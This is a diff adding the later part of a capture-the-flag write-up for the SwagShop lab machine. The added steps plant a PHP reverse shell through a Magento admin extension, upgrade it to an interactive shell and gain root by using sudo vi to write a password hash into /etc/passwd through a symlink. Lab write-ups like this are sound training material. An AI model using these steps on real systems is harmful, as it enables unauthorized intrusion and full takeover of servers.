@@ -102,9 +102,109 @@ we have creds now after logging in i looked up for exploits to get shell and fou
 So after googling around, I found the [extension](https://pluginarchive.com/magento/magpleasure_filesystem) and way to upload it ...
 
 
+<<picture 12>>
+
+So after clicking it we got the portal to login
+
+<<picture 13>>
+
+we will use same creds from exploit *forme:forme*
+
+<<picture 14>>
+
+We will upload the filesystem extension 
+
+<<picture 15>>
+
+Now we will go back to admin panel by click on this section
+
+<<picture 16>>
+
+go to System -->File system-->IDE
+
+<<picture 17>>
+
+Open the get.php and replace with the php reverse shell which i got from [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
+<<picture 18>>
+
+We got the shell when we opened this link [http://10.10.10.140](http://10.10.10.140)
+
+<<picture 19>>
+
+now we will first make the shell fully interactive
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl +z
+stty raw -echo  
+fg
+export SHELL=bash
+export TERM=xterm
+```
+Output:-
+```
+$ which python3                  
+/usr/bin/python3
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@swagshop:/$ ^Z
+[1]+  Stopped                 nc -nvlp 1234
+[sarthak@sarthak swagshop]$ stty raw -echo  
+[sarthak@sarthak swagshop]$ nc -nvlp 1234
+
+www-data@swagshop:/$ export SHELL=bash
+www-data@swagshop:/$ export TERM=xterm
+www-data@swagshop:/$ 
+```
+
+now we will see if we have sudo permissions
+
+```
+www-data@swagshop:/$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+www-data@swagshop:/$ 
+
+```
+
+We can run vi with everything inside html so what we will do is we will make a symlink of passwd file and we will place a openssl hash at root section to login !!
 
 
+We have created a symlink ...
+```
+www-data@swagshop:/$ ln -s /etc/passwd /var/www/html/
+```
 
+Now we have created a password hash for root as 'pass123'
+
+<<picture21>>
+
+Open passwd file with vi
+```
+www-data@swagshop:/$ sudo /usr/bin/vi /var/www/html/passwd
+```
+Placed the hash 
+
+<<picture 22>>
+
+Now login as root
+
+```
+www-data@swagshop:/$ su root
+Password: 
+root@swagshop:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@swagshop:/# 
+```
+
+<<picture 23>>
+
+That's for all for today guys
+I hope you would enjoy this writeup..!!
 
 
 
